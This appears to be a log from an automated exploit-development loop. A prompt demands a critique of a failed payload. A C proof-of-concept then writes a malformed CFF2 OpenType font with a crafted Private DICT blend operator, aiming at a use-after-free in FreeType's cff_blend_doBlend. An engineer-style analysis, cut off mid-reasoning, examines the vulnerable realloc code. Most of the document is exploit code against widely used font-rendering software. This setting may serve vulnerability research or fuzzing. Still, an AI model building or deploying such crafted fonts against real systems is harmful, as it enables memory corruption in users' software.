=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

static void write_cff_shortint(FILE *f, int16_t v) {
    fputc(0x1C, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F);
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF2' */
    write_uint32(f, 0x43464632);
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    long top_dict_len_pos = ftell(f);
    write_uint16(f, 0);

    /* ---- Top DICT ---- */
    long top_dict_start = ftell(f);

    /* FDArray operator */
    long fdarray_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x24, f);

    /* FDSelect operator */
    long fdselect_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); fputc(0x25, f);

    /* CharStrings operator */
    write_cff_byte_int(f, 0);
    fputc(0x11, f);

    /* VariationStore operator */
    long vstore_op_pos = ftell(f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x18, f);

    long top_dict_end = ftell(f);
    uint16_t top_dict_len = top_dict_end - top_dict_start;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* ---- FDArray INDEX ---- */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - table_start;
    fseek(f, fdarray_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdarray_offset >> 8) & 0xFF, f);
    fputc(fdarray_offset & 0xFF, f);
    fseek(f, fdarray_start, SEEK_SET);

    write_uint32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    long offset1_pos = ftell(f);
    fputc(0x00, f);

    /* Font DICT */
    long font_dict_start = ftell(f);
    long priv_size_pos = ftell(f);
    write_cff_byte_int(f, 0);
    long priv_offset_pos = ftell(f);
    write_cff_byte_int(f, 0);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_len = font_dict_end - font_dict_start;

    fseek(f, offset1_pos, SEEK_SET);
    fputc(1 + font_dict_len, f);
    fseek(f, font_dict_end, SEEK_SET);

    /* ---- FDSelect (format 0: 1 byte format + 1 byte FD index per glyph) ---- */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - table_start;
    fseek(f, fdselect_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((fdselect_offset >> 8) & 0xFF, f);
    fputc(fdselect_offset & 0xFF, f);
    fseek(f, fdselect_start, SEEK_SET);
    fputc(0x00, f);  /* format = 0 */
    fputc(0x00, f);  /* FD index for glyph 0 = 0 */

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* Push vsindex = 0 (operator 22) */
    write_cff_byte_int(f, 0);
    fputc(0x16, f); /* vsindex operator */
    /* Push 5 values for blend */
    write_cff_byte_int(f, 10);
    write_cff_byte_int(f, 20);
    write_cff_byte_int(f, 30);
    write_cff_byte_int(f, 40);
    write_cff_byte_int(f, 50);
    /* Push numBlends = 1 */
    write_cff_byte_int(f, 1);
    /* CFF2 blend operator: single byte 0x17 (23) */
    fputc(0x17, f);
    /* Push integer after blend to trigger use-after-free */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    /* Patch Private DICT size and offset */
    fseek(f, priv_size_pos, SEEK_SET);
    fputc(private_len + 139, f);
    fseek(f, priv_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* ---- CharStrings INDEX (1 glyph: endchar) ---- */
    write_uint32(f, 1);     /* count = 1 */
    fputc(0x01, f);         /* offSize = 1 */
    fputc(0x01, f);         /* offset[0] = 1 */
    fputc(0x02, f);         /* offset[1] = 2 (1 byte of data) */
    fputc(0x0E, f);         /* endchar */

    /* ---- Global Subr INDEX (empty) ---- */
    write_uint32(f, 0);

    /* ---- VariationStore ---- */
    long vstore_start = ftell(f);
    uint32_t vstore_offset = vstore_start - table_start;
    fseek(f, vstore_op_pos, SEEK_SET);
    fputc(0x1C, f);
    fputc((vstore_offset >> 8) & 0xFF, f);
    fputc(vstore_offset & 0xFF, f);
    fseek(f, vstore_start, SEEK_SET);

    write_uint16(f, 1);
    long vrl_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1);
    long ivd_offset_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    uint32_t vrl_offset_val = vrl_start - vstore_start;
    fseek(f, vrl_offset_pos, SEEK_SET);
    write_uint32(f, vrl_offset_val);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 16384);
    write_uint16(f, 16384);

    long ivd_start = ftell(f);
    uint32_t ivd_offset_val = ivd_start - vstore_start;
    fseek(f, ivd_offset_pos, SEEK_SET);
    write_uint32(f, ivd_offset_val);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 1);
    write_uint16(f, 0);
    write_uint16(f, 0);

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}
```

The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:

To trigger CFF2 parsing, the font must be a valid CFF2 font, and the glyph loading must parse the private dict to reach the blend operator.

Looking at the ftfuzzer code: It calls FT_New_Memory_Face, then loops over faces and instances, then for each glyph calls FT_Load_Glyph. So to reach cff_blend_doBlend, we need the font to be parsed and loaded, and during glyph loading, the CFF2 private dict must be parsed, which includes the blend operator (0x17). However, the blend operator is part of the private dict of a Font DICT that is referenced by a glyph. In CFF2, the FDArray/FDSelect are used for CID-keyed fonts, and blends are allowed in private dicts of those FDArray entries.

The previous PoC attempted to create a CFF2 font with proper structure: Top DICT with FDArray, FDSelect, CharStrings, VariationStore. But the output shows the binary exited normally, meaning the font was accepted but glyph loading didn't crash. The vulnerability requires that cff_blend_doBlend is called with a large numBlends that causes a reallocation of blend_stack, and then writes beyond the allocated buffer (use-after-free or out-of-bounds write). Specifically, the code:

```c
size = 5 * numBlends;
if ( subFont->blend_used + size > subFont->blend_alloc )
{
    if ( FT_REALLOC( subFont->blend_stack,
                      subFont->blend_alloc,
                      subFont->blend_alloc + size ) )
      goto Exit;
    subFont->blend_top    = subFont->blend_stack + subFont->blend_used;
    subFont->blend_alloc += size;
}
subFont->blend_used += size;
...
for ( i = 0; i < numBlends; i++ )
{
    ...
    *subFont->blend_top++             = 255;
    *((FT_UInt32*)subFont->blend_top) = (FT_UInt32)sum;
    subFont->blend_top               += 4;
}
```

The vulnerability is that after the reallocation, `blend_top` is set to `blend_stack + blend_used`, but then `blend_used` is incremented by `size`. Then in the loop, it writes `5*numBlends` bytes (a byte plus a 32-bit integer per blend) using `blend_top` as base. If the reallocation succeeded, then the buffer is `blend_alloc + size` bytes. But after decrementing? Actually, the reallocation allocates `blend_alloc + size` bytes. Then `blend_alloc += size`. Then `blend_used += size`. Then the loop writes `blend_top` entries: each entry writes 1 byte (0xFF) and 4 bytes (sum). So total written = `5*numBlends` bytes. Since `size = 5*numBlends`, this is exactly the amount newly allocated. So no overflow.

Wait, the vulnerability description says "use-after-free" maybe? Actually, looking at the code: After reallocation, `blend_top` is set to `blend_stack + blend_used`. Then `blend_used += size`. Then the loop writes starting at `blend_top` and increments. So the write goes into the newly allocated space. That seems safe. Unless the reallocation had just the exact size, but the loop writes beyond? No, it writes `5*numBlends` bytes, which is `size`. So no overflow.

Perhaps the vulnerability is in a different scenario: if the reallocation fails (FT_REALLOC returns error), then it goes to Exit, which may leave dangling pointers? Or if `blend_stack` is freed without updating `blend_top`? The code after the if block:

```c
if ( FT_REALLOC( subFont->blend_stack,
                  subFont->blend_alloc,
                  subFont->blend_alloc + size ) )
  goto Exit;

```

If FT_REALLOC fails, it returns non-zero, so goto Exit. That should be safe.
